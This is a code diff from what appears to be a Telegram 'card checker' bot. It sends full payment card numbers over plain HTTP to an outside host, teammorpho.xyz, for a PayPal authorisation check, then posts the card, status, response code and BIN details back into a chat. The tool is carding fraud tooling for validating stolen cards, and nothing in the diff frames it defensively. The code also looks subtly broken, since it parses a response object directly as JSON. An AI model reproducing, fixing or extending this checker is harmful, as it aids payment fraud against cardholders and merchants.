@@ -148,8 +148,9 @@ Retry After {after}s
                             authurl = f"http://teammorpho.xyz/api/001paypal.php?lista={fullcc}"
                             reqone = session.get(authurl)
                             data = json.loads(reqone)
-                            stat = data["status"]
-                            ress = data["resp"]
+                            stat = data["stuts"]
+                            ress = data["respp"]
+                            code = data["code"]
                             fourthresp = f"""
 <b> PAYPAL AUTH
 ━━━━━━━━━
@@ -235,6 +236,7 @@ Retry After {after}s
 ┠ Card - <code>{fullcc}</code> 
 ┠ Status - <code>{stat}</code> 
 ┠ Resp - <code>{ress}</code> 
+┠ Code - <code>{code}</code> 
 ┠－－－－－－－－－－－－－－－－
 ┠ BIN INFO
 ┠ Bin - {fbin} - {brand} - {type} - {level}
